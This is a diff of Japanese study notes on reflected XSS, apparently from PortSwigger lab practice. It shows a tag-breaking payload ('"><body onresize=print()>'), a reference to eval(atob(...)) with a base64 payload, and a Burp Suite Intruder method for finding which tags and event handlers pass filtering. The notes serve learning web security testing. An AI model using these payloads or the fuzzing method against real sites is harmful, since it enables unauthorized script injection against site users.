@@ -96,20 +96,19 @@ eval(atob("<base64エンコードした上記ペイロード>"))
 <h1>0 search results for '<userinput>'</h1>
 ```
 
-これに対して、
+これに対して、`</h1>`とすることなく、`>`でタグを閉じ、`<body...`のようなペイロードを注入できる
 ```
 "><body onresize=print()>"
 ```
 
 ### HTMLタグ内のXSSメソドロジー
 
-1. 有効なタグを割り出す。[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#event-handlers)でCopy tags to clipboardしてPayload settingsにペースト
-
+1. 有効なタグを割り出すため、🔗[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#event-handlers)でCopy tags to clipboardしてBurp Suite IntruderのPayload settingsにペースト
 ```http
 GET /?search=<§§> HTTP/2
 ```
 
-2. 有効なイベントを割り出す。cheat sheetのCopy events to clipboardしてペースト（`%20` = 空白）
+2. 有効なイベントを割り出すため、cheat sheetのCopy events to clipboardをクリックし、ペースト（`%20` = 空白）
 
 ```http
 GET /?search=<有効なタグ%20§§=1> HTTP/2
